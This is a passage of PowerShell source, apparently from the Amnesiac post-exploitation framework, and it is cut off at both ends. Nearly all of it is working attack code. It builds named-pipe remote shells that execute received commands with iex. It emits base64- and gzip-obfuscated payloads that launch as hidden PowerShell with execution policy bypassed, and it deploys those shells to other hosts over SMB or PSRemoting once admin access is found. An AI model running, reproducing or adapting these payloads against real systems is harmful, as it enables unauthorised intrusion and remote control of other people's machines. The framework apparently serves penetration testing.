					$global:Message = $null
					
					# Sleep for a short interval before the next iteration
					Start-Sleep -Seconds $timeInterval

					# Increment elapsed time
					$elapsedTime += $timeInterval
				}
				
				# Exit the loop properly by reading the key press
				#$null = [System.Console]::ReadKey($true)
				
				$global:Message = $null
				$choice = $null

				if($global:RestoreAllUserDefinedTargets -eq $True){$global:AllUserDefinedTargets = $global:OldTargetsToRestore;$global:RestoreAllUserDefinedTargets = $False}
				if($global:RestoreOldMultiPipeName -eq $True){$global:MultiPipeName = $global:OldPipeNameToRestore;$global:RestoreOldMultiPipeName = $False}
			}
			'4' {
				$LocalAdminAccessOutput = $null
				$global:OldPipeNameToRestore = $global:MultiPipeName
				$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
				
				$PN = $global:MultiPipeName
				$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
				
				if($global:localadminaccesspayload -eq 'PSRemoting'){
					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
			
					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
					
					$finalstring =  "powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
					
					if(!$global:AllUserDefinedTargets){
						$LocalAdminAccessOutput = Find-LocalAdminAccess -Method PSRemoting -Command $finalstring -NoOutput
					}
					else{
						$LocalAdminAccessTargets = $global:AllUserDefinedTargets -join ","
						$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method PSRemoting -Command $finalstring -NoOutput
					}
				}
				
				elseif($global:localadminaccesspayload -eq 'SMB'){					
					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
			
					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
					
					$finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
					
					$finalstring = $finalstring -replace '"', "'"
					
					if(!$global:AllUserDefinedTargets){
						$LocalAdminAccessOutput = Find-LocalAdminAccess -Method SMB -Command $finalstring -NoOutput
					}
					else{
						$LocalAdminAccessTargets = $global:AllUserDefinedTargets -join ","
						$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method SMB -Command $finalstring -NoOutput
					}
				}
				
				$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
				$LocalAdminAccessOutput = ($LocalAdminAccessOutput | Out-String) -split "`n"
				$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
				$LocalAdminAccessOutput = $LocalAdminAccessOutput | Where-Object { $_ -ne "" }
				
				$adminLines = $LocalAdminAccessOutput | Where-Object { $_ -match "has Local Admin access on" }
				$noAccessLines = $LocalAdminAccessOutput | Where-Object { $_ -match "No Access" }
				
				if($adminLines.Count -eq 0){
					# Failed to execute
					$global:MultiPipeName = $global:OldPipeNameToRestore
					$global:ScanModer = $False
					$global:Message = " [-] Failed to execute"
					continue
				}
				
				elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0){
					# No Admin Access
					$global:MultiPipeName = $global:OldPipeNameToRestore
					$global:ScanModer = $False
					if($global:localadminaccesspayload -eq 'PSRemoting'){$global:Message = " [-] No Admin Access [PSRemoting]"}
					elseif($global:localadminaccesspayload -eq 'SMB'){$global:Message = " [-] No Admin Access [SMB]"}
					continue
				}
				
				elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0){
					
					$TempAdminAccessTargets = $LocalAdminAccessOutput | Where-Object { $_ -notmatch "has Local Admin access on" -AND $_ -notmatch "Command execution completed"}
					
					if($global:localadminaccesspayload -eq 'PSRemoting'){$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]"}
					elseif($global:localadminaccesspayload -eq 'SMB'){$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [SMB]"}
					
					$global:ScanModer = $True
					$global:RestoreOldMultiPipeName = $True
					$global:OldTargetsToRestore = $global:AllUserDefinedTargets
					$global:AllUserDefinedTargets = $TempAdminAccessTargets
					$global:RestoreAllUserDefinedTargets = $True
					Start-Sleep 1
					continue
				}
			}
			default {
				# If choice is numeric and in the range of directAdminSessions indices
				if ($choice -is [int] -and $choice -ge 5 -and $choice -lt ($global:directAdminSessions.Count + 5)) {
					$selectedIndex = $choice - 5
					$selectedTarget = $global:directAdminSessions[$selectedIndex]
					if($global:Detach){Detached-Interaction -Target $selectedTarget -TimeOut $Timeout}
					else{Choose-And-Interact -Target $selectedTarget -TimeOut $Timeout}
				} elseif ($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + 5) -and $choice -lt ($global:directAdminSessions.Count + $global:listenerSessions.Count + 5)) {
					$selectedIndex = $choice - 5 - $global:directAdminSessions.Count
					$selectedSession = $global:listenerSessions[$selectedIndex]
					InteractWithPipeSession -PipeServer $selectedSession.PipeServer -StreamWriter $selectedSession.StreamWriter -StreamReader $selectedSession.StreamReader -computerNameOnly $selectedSession.ComputerName -PipeName $selectedSession.PipeName
				} elseif ($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + $global:listenerSessions.Count + 5) -and $choice -lt ($global:directAdminSessions.Count + $global:listenerSessions.Count + $global:MultipleSessions.Count + 5)) {
					$selectedIndex = $choice - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
					$selectedMultiSession = $global:MultipleSessions[$selectedIndex]
					InteractWithPipeSession -PipeClient $selectedMultiSession.PipeClient -StreamWriter $selectedMultiSession.StreamWriter -StreamReader $selectedMultiSession.StreamReader -computerNameOnly $selectedMultiSession.ComputerName -PipeName $selectedMultiSession.PipeName -UniquePipeID $selectedMultiSession.UniquePipeID
				} else {
					$global:Message = " [-] Invalid selection. Please try again."
				}
			}
		}
	}
}

function Display-SessionMenu {
	
	#for ($i=0; $i -lt $host.UI.RawUI.WindowSize.Height; $i++) {Write-Output ""}
    #Clear-Host
	$Banner = @('

     :::     ::::     :::: ::::    ::: :::::::::: :::::::: :::::::::::     :::      ::::::::  
   :+: :+:   +:+:+: :+:+:+ :+:+:   :+: :+:       :+:    :+:    :+:       :+: :+:   :+:    :+: 
  +:+   +:+  +:+ +:+:+ +:+ :+:+:+  +:+ +:+       +:+           +:+      +:+   +:+  +:+        
 +#++:++#++: +#+  +:+  +#+ +#+ +:+ +#+ +#++:++#  +#++:++#++    +#+     +#++:++#++: +#+        
 +#+     +#+ +#+       +#+ +#+  +#+#+# +#+              +#+    +#+     +#+     +#+ +#+        
 #+#     #+# #+#       #+# #+#   #+#+# #+#       #+#    #+#    #+#     #+#     #+# #+#    #+# 
 ###     ### ###       ### ###    #### ########## ######## ########### ###     ###  ########  ')

	$BannerLink = '                                           [Version: 1.0.4] https://github.com/Leo4j/Amnesiac'
	
	if($Night){
		Write-Output $Banner
		Write-Output ""
		Write-Output $BannerLink
	}
	else{
		Write-Output $Banner
		Write-Output ""
		Write-Output $BannerLink
	}
	
	if($ShowMenuCommands){
		Write-Output ""
		Write-Output " Available Commands:"
		Write-Output " bookmark <sess.numb.>    Bookmark selected session"
		Write-Output " bookmarks                Hide/Display Bookmarks"
		Write-Output " exit                     Quit Amnesiac"
		Write-Output " Find-LocalAdminAccess    Switch between SMB and PSRemoting"
		Write-Output " GLSet <string>           Set Global-Listener Pipe Name"
		Write-Output " help                     Displays this list of commands"
		Write-Output " kill <sess.numb.>        Kill selected session"
		Write-Output " kill all                 Kill all sessions"
		Write-Output " RepoURL                  Set Repo URL to Default"
		Write-Output " RepoURL <URL>            Set Repo URL to specified URL"
		Write-Output " scramble                 Rotate Global-Listener Pipe Name"
		Write-Output " Serve                    Serve scripts from 0.0.0.0:8080"
		Write-Output " Serve <port> <folder>    Serve scripts from specified folder and port"
		Write-Output " sessions                 Hide/Display Active Sessions"
		Write-Output " switch                   Switch between SMB and WMI for Admin Access Scan"
		Write-Output " targets                  Hide/Display User-Defined Targets"
		Write-Output " targets <Path or tgrts>  Path or `"comma_separated_Targets`""
		Write-Output " targets check            Check for and list only alive targets"
		Write-Output " targets clear            Clear all User-Defined Targets"
		Write-Output " toggle                   Switch payload format (default: b64)"
		Write-Output " unbookmark <sess.numb.>  Remove a bookmark"
		Write-Output "" 
	}
	
	if($ShowUserDefinedTargets){
		Write-Output " User-Defined Targets:"
		foreach($UDT in $UserDefinedTargets){
			Write-Output " $UDT"
		}
		Write-Output ""
	}
	
    # Display Available Options
    Write-Output " Available Options:"
    Write-Output " [0] Scan network for Admin Access"
    Write-Output " [1] Single-Listener (single target)"
	Write-Output " [2] Global-Listener (multiple targets)"
	Write-Output " [3] Scan network for listening targets"
	Write-Output " [4] Shell via Find-LocalAdminAccess"
	
	# Starting index
    $index = 5
	
	#$global:MultipleSessions = [System.Collections.Generic.List[psobject]]$global:MultipleSessions
	
	if($ShowSessions){
	
		# Display Direct Admin Access Sessions
		if ($global:directAdminSessions.Count -gt 0) {
			Write-Output ""
			Write-Output " Admin Sessions:"
			$AdminSessionObject = foreach ($session in $global:directAdminSessions) {
				
				[PSCustomObject]@{
					'SX' = " [$index]";
					'SHost' = $session;
					'SUser' = $null
				}
				
				#Write-Output " [$index] $session"
				$index++
			}
			
			$AdminSessionObject | ft -Autosize -HideTableHeaders | Out-String | ForEach-Object { $_ -replace '^\s*\n' -replace '\n\s*$' }
		}

		# Display Single Listener Sessions
		if ($global:listenerSessions.Count -gt 0) {
			Write-Output ""
			Write-Output " Single Listener Sessions:"
			#$global:listenerSessions = [System.Collections.Generic.List[psobject]]($global:listenerSessions | Sort-Object { $_.ComputerName.ToString(),$_.UserID.ToString(),$_.PipeName.ToString() })
			$listenerIndex = 0
			$SingleSessionObject = foreach ($listener in $global:listenerSessions) {
				$sessionName = $listener.ComputerName
				$sessionuser = $listener.UserID
				
				[PSCustomObject]@{
					'SX' = " [$index]";
					'SHost' = $sessionName;
					'SUser' = " [$sessionuser]"
				}
				
				#Write-Output " [$index] $sessionName"
				# Update bookmark
				UpdateBookmark $listener.PipeName ($index)
				$index++
				$listenerIndex++
			}
			
			$SingleSessionObject | ft -Autosize -HideTableHeaders | Out-String | ForEach-Object { $_ -replace '^\s*\n' -replace '\n\s*$' }
		}
		
		# Display Multiple Listener Sessions
		if ($global:MultipleSessions.Count -gt 0) {
			Write-Output ""
			Write-Output " Global-Listener Sessions:"
			#$global:MultipleSessions = [System.Collections.Generic.List[psobject]]($global:MultipleSessions | Sort-Object { $_.ComputerName.ToString(),$_.UserID.ToString(),$_.UniquePipeID.ToString() })
			$multiListenerIndex = 0
			$MultiSessionObject = foreach ($multilistener in $global:MultipleSessions) {
				$sessionName = $multilistener.ComputerName
				$sessionuser = $multilistener.UserID
				
				[PSCustomObject]@{
					'SX' = " [$index]";
					'SHost' = $sessionName;
					'SUser' = " [$sessionuser]"
				}
				
				#Write-Output " [$index] $sessionName"
				# Update bookmark
				UpdateBookmark $multilistener.UniquePipeID ($index)
				$index++
				$multiListenerIndex++
			}
			
			$MultiSessionObject | ft -Autosize -HideTableHeaders | Out-String | ForEach-Object { $_ -replace '^\s*\n' -replace '\n\s*$' }
		}
		
	}
	
	# Display Bookmarks
	if($ShowBookmarks){
		if ($global:bookmarks.Count -gt 0) {
			Write-Output ""
			Write-Output " Bookmarks:"
			$global:bookmarks = [System.Collections.Generic.List[psobject]]($global:bookmarks | Sort-Object { [int]([regex]::Match($_.DisplayName, '(?<=\[)\d+(?=\])').Value) })
			$BookmarksObject = $global:bookmarks | ForEach-Object {
				
				[PSCustomObject]@{
					'SX' = $_.DisplayName.TrimEnd();
					'SHost' = $_.DisplayComputerName;
					'SUser' = " [$($_.DisplayUserID)]"
				}
				
				#Write-Output $bookmark.DisplayName
			}
			
			$BookmarksObject | ft -Autosize -HideTableHeaders | Out-String | ForEach-Object { $_ -replace '^\s*\n' -replace '\n\s*$' }
		}
	}
	
    Write-Output ""
	
	if($global:Message){
		$global:Message = $global:Message -split "`n"
		$global:Message = $global:Message | Where-Object { $_ -ne '' -and $_ -ne $null }
		foreach ($line in $global:Message) {
			Write-Output $line
		}
		$global:Message = $null
		Write-Output ""
	}
	
}

function UpdateBookmark($identifier, $newIndex) {
    $bookmark = $global:bookmarks | Where-Object { $_.Identifier -eq $identifier }
    if ($bookmark) {
        # Extract the hostname from the original display name
        $hostname = ($bookmark.DisplayName -split '\] ')[1]
        $bookmark.DisplayName = " [$newIndex] $hostname"
    }
}

function Start-Listener {
	
	param (
        [string]$SinglePipeName,
		[switch]$HidePayload
    )
	
    # Load necessary .NET assemblies
	Add-Type -AssemblyName System.Core

	if(!$SinglePipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$PipeName = $randomvalue -join ""
	} else {$PipeName = $SinglePipeName}
	
	$ComputerName = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName

	$ClientScript="`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('#END#');`$w.Flush()}`$p.Close();`$p.Dispose()"
	
	$RawClientScript = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream(""$ComputerName"",""$PipeName"",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq ""exit""){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split ""`u{000A}""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split ""`u{000D}`u{000A}""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine(""#END#"");`$w.Flush()}`$p.Close();`$p.Dispose()"
	
	$PwshRawClientScript = $RawClientScript
	
	$RawClientScript = $RawClientScript.Replace("`"", "`\`"")
	
	$RawClientScript = $RawClientScript.Replace('2>&1 ', '2^^^>^^^&1 ^^^')
	
	<#
	$ClientScript = @"
`$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", "$PipeName", 'InOut')
`$sr = New-Object System.IO.StreamReader(`$pipeClient)
`$sw = New-Object System.IO.StreamWriter(`$pipeClient)
`$pipeClient.Connect()
`$sw.WriteLine("`$env:COMPUTERNAME,`$(Get-Location)")
`$sw.Flush()
while (`$true) {
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break}
	try {
		`$result = Invoke-Expression "`$command 2>&1 | Out-String"
		`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
	} catch {
		`$errorMessage = `$_.Exception.Message
		`$errorMessage -split "`r?`n" | ForEach-Object {`$sw.WriteLine(`$_)}
	}
	`$sw.WriteLine("#END#")
	`$sw.Flush()
}
`$pipeClient.Close()
`$pipeClient.Dispose()
"@
#>
	
	$b64ClientScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScript))
	
	if(!$HidePayload){
		if($global:payloadformat -eq 'exe'){
			$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($PipeName).exe"
   			Write-Output ""
			Write-Output " [+] Payload saved to: $exefilelocation"
			Write-Output ""
		}
		else{
			Write-Output ""
			Write-Output " [+] Payload:"
			Write-Output ""
		}
		if($global:payloadformat -eq 'b64'){
			Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript & exit"
			Write-Output ""
		}
		elseif($global:payloadformat -eq 'raw'){
			Write-Output " cmd /c powershell -windows hidden `"$RawClientScript`" & exit"
			Write-Output ""
		}
		elseif($global:payloadformat -eq 'pwraw'){
			Write-Output " $PwshRawClientScript"
			Write-Output ""
		}
		elseif($global:payloadformat -eq 'pwsh'){
			$ClientScriptEdit = $ClientScript += ";exit"
			$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
			Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
			Write-Output ""
		}
  		elseif($global:payloadformat -eq 'gzip'){
			$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawClientScript)
			$memoryStream = [System.IO.MemoryStream]::new()
			$gzipCompressor = [System.IO.Compression.GzipStream]::new($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
			$gzipCompressor.Write($bytesToCompress, 0, $bytesToCompress.Length)
			$gzipCompressor.Close()
			$gzipcompressedBytes = $memoryStream.ToArray()
			$gzipcompressedBase64 = [Convert]::ToBase64String($gzipcompressedBytes)
			Write-Output " `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
			Write-Output ""
			Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
			Write-Output ""
		}
  		elseif($global:payloadformat -eq 'exe'){
			$ClientScriptEdit = $ClientScript += ";exit"
			$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
			$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
			PS1ToEXE -content $exescript -outputFile $exefilelocation
		}
	}

	# Create security descriptor to allow everyone full control over the pipe
	$securityDescriptor = New-Object System.IO.Pipes.PipeSecurity
	$everyone = New-Object System.Security.Principal.SecurityIdentifier "S-1-1-0"
	$accessRule = New-Object System.IO.Pipes.PipeAccessRule($everyone, "FullControl", "Allow")
	$securityDescriptor.AddAccessRule($accessRule)

	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', 1028, 1028, $securityDescriptor)
	
	$psScript = "Start-Sleep -Seconds 30; `$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(`".`", `"$pipeName`", 'InOut'); `$dummyPipeClient.Connect(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient); `$sw.WriteLine(`"dummyhostdropconnection,`$(Get-Location)`"); `$sw.Flush(); `$dummyPipeClient.Close()"
	
	$b64psScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psScript))
	
	Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64psScript" -WindowStyle Hidden
		
	Write-Output " [*] Waiting for connection... [30 seconds timeout]"
 	
  	$pipeServer.WaitForConnection()

	$sr = New-Object System.IO.StreamReader($pipeServer)
	$sw = New-Object System.IO.StreamWriter($pipeServer)
	
	# Get the hostname and $pwd from the client
	$initialInfo = $sr.ReadLine().Split(',')
	$computerNameOnly = $initialInfo[0]
	$remotePath = $initialInfo[1]
	$UserIdentity = $initialInfo[2]
	
	if ($computerNameOnly -eq 'dummyhostdropconnection') {
		$global:Message = " [-] No connection was established"
		#Write-Output "[-] No connection was established. Returning to previous menu..."
		
		# Close resources related to this pipe and return to the previous menu.
		
		# Ensure StreamWriter is not closed and then close it
		if ($sw) {
			$sw.Close()
		}

		# Ensure StreamReader is not closed and then close it
		if ($sr) {
			$sr.Close()
		}

		# Close the pipe
		if ($pipeServer -and $pipeServer.IsConnected) {
			$pipeServer.Close()
		}
		return
	}

	# When the client connects, store its details in the $sessions array
	$session = [PSCustomObject]@{
		'PipeName' = $PipeName;
		'PipeServer' = $pipeServer;
		'StreamReader' = $sr;
		'StreamWriter' = $sw;
		'ComputerName' = $computerNameOnly;
		'RemotePath'   = $remotePath;
		'UserID'   = $UserIdentity
	}

	# Adding the session to the global list
	$global:listenerSessions.Add($session)
	
	# Notify the user
	#Write-Output "[+] New session established [$computerNameOnly]"
	$global:Message = " [+] New session established [$computerNameOnly]"
	#Write-Output ""
}

function Print-MultiListener {
	param ([switch]$NoWait)
	
	# Load necessary .NET assemblies
	Add-Type -AssemblyName System.Core

	$PN = $global:MultiPipeName
	$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
	
	if($global:Detach){
		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
	
		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""S-1-1-0"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""#END#"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
	}
	else{
		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 